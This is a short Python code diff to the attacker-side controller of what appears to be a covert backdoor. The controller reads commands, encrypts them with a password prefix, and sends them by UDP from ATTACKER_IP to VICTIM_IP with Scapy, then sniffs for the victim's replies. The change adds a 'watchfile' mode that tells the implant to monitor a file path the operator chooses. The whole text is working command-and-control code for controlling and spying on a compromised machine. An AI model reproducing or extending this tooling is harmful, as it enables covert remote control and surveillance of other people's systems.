@@ -35,19 +35,22 @@ def main():
     # Main loop
     while 1:
         command = raw_input("Command to send:")
-        command = PASSWORD + command
+        if command == 'watchfile':
+            watch_patch = raw_input("Path to watch:")
+            command = PASSWORD + "1" + watch_patch
+        else:
+            command = PASSWORD +"0" + command
 
         cipher_command = encrypt(command)
 
         packet = IP(dst=VICTIM_IP, src=ATTACKER_IP) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / cipher_command
 
-        #packet = IP(dst=VICTIM_IP) / UDP() / Raw(load=cipher_command)
 
 
         send(packet)
         sniff(filter="udp and src port " + str(VICTIM_PORT) + " and dst port " + str(ATTACKER_PORT), stop_filter=stp_filter, prn=sniff_callback)
 
-        #sniff(stop_filter=stp_filter, prn=sniff_callback)
+
 
 
 if __name__ == '__main__':
